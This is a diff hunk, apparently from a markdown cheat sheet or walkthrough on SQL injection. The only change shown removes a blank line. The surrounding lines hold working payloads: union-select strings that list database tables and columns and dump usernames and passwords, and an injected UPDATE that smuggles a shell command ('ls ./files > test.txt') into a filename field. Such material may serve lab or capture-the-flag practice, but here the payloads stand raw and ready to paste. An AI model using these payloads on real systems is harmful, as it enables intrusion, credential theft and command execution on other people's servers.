@@ -55,7 +55,6 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 ```
 ' union select 1,2,3,table_schema,table_name from information_schema.tables -- - >> To fetch database name with table name
 
-
 ' union select 1,2,column_name,null,null from information_schema.columns where table_schema = 'database_name' and table_name = 'table_name' -- - >> To fetch column name from specific table
 
 ' union select 1,2,username,password,null from database_name.table_name -- >> To fetch info from specific column
